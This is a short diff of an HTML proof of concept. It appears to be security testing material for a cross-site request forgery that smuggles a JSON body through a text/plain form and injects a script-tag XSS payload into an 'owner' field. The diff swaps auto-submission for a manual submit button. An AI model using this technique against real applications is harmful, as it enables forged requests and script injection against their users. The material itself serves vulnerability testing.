@@ -5,9 +5,10 @@
       method="post" enctype="text/plain">
     <input type="hidden" name='{"x":"'
            value='","name":"x", "owner":"&lt;script&gt;alert(&apos;XSS!&apos;); &lt;/script&gt;"}' />
+<input type="submit" value="Submit">
 </form>
 <script type="text/javascript">
-document.getElementById("test").submit();
+//document.getElementById("test").submit();
 </script>
 </body>
 </html>
